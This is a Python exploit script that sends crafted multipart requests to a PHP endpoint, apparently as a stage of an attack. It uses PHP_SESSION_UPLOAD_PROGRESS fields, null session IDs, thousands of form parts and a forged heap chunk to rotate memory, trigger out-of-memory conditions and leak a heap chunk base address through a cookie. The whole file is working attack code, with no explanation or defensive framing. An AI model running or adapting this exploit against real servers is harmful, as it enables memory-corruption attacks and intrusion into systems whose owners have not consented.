import os
import sys, time, struct
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from exploit import Target, build_multipart, parse_cookie, chunk_base_from_cookie

URL = sys.argv[1] if len(sys.argv) > 1 else "http://localhost/izin.php"
t = Target(URL, timeout=60, verbose=False)
SID = b"attacksessionid0001"

def filepart(): return {"name": "f", "filename": "a.txt", "data": b"A" * 64}

# rotate
parts = [{"name": f"f{i:04d}"[:5], "data": b"V" * 3000} for i in range(1001)]
parts += [{"name": "PHPSESSID", "data": b"\x00"}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}, filepart(), {"name": "big", "data": b"B" * (12 * 1024 * 1024)}]
try:
    r0 = t.post(build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=60)
except Exception as e:
    print("rotate EXC:", e); sys.exit(1)
time.sleep(0.3)

# stage 1 reqA
parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
parts += [{"name": "PHPSESSID", "data": b"\x00"}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}, filepart(), {"name": "big", "data": b"B" * (12 * 1024 * 1024)}]
try:
    rA = t.post(build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=60)
except Exception as e:
    print("reqA EXC:", e); sys.exit(1)
oom = b"Allowed memory size" in rA
print(f"reqA: len={len(rA)} OOM={oom}")
print("reqA head:", rA[:200].decode("utf-8", "replace"))
time.sleep(0.2)

# stage 1 reqB
parts = [{"name": "PHPSESSID", "data": SID}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
for i in range(841):
    parts.append({"name": str(1000 + i), "data": (f"v{i:04d}" + "x" * 44)[:48].encode()})
forge = bytearray(b"A" * 79); struct.pack_into("<Q", forge, 0x10, 0x1000); forge[0x18] = ord("L")
parts.append({"name": "1999", "data": bytes(forge)})
try:
    resp = t.post(build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20)
except Exception as e:
    print("reqB EXC:", e); sys.exit(1)
raw = parse_cookie(resp)
print(f"reqB: len={len(resp)} cookie_len={len(raw) if raw else 0}")
if raw:
    cb = chunk_base_from_cookie(raw)
    print("chunk base:", hex(cb) if cb else None)
else:
    print("no cookie (stage 1 leak did not reproduce)")
    print("reqB head:", resp[:300].decode("utf-8", "replace"))
